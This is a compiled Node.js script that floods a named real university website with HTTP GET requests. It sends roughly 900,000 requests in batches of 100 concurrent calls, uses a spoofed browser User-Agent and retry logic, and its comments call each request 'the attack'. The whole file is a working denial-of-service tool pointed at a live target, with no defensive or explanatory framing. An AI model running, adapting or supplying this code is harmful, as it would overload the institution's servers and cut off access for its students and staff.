"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
// Axios request options with a 5-second timeout
const options = {
    method: 'GET',
    url: 'https://curaj.ac.in/',
    timeout: 5000, // Set timeout to 5 seconds
    headers: {
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,en-IN;q=0.8',
        Connection: 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'
    }
};
// Delay function to introduce pauses between requests
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
// Function to perform the attack with retry logic
function attack() {
    return __awaiter(this, arguments, void 0, function* (retries = 3) {
        try {
            const { data } = yield axios_1.default.request(options);
            return { success: true, data };
        }
        catch (error) {
            if (retries > 0) {
                console.warn(`Retrying... Attempts left: ${retries}`);
                yield delay(1000); // 1-second delay before retrying
                return attack(retries - 1);
            }
            return { success: false, error: error.message };
        }
    });
}
// Main function to perform the attack in batches
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        let totalRequests = 0;
        for (let i = 100000; i < 999999; i += 100) {
            yield delay(1000); // 1-second delay between batches
            let promises = [];
            console.log(`Starting batch for i = ${i}`);
            for (let j = 0; j < 100; j++) {
                promises.push(attack());
            }
            const batchResponses = yield Promise.all(promises);
            totalRequests += 100;
            if (totalRequests % 100 === 0) {
                const sampleResponse = batchResponses[0];
                if (sampleResponse.success) {
                    const response = sampleResponse.data.toString();
                    console.log(`Response after ${totalRequests} requests:`, response.substring(0, 100));
                }
                else {
                    console.error(`Error after ${totalRequests} requests:`, sampleResponse.error);
                }
            }
        }
    });
}
main();
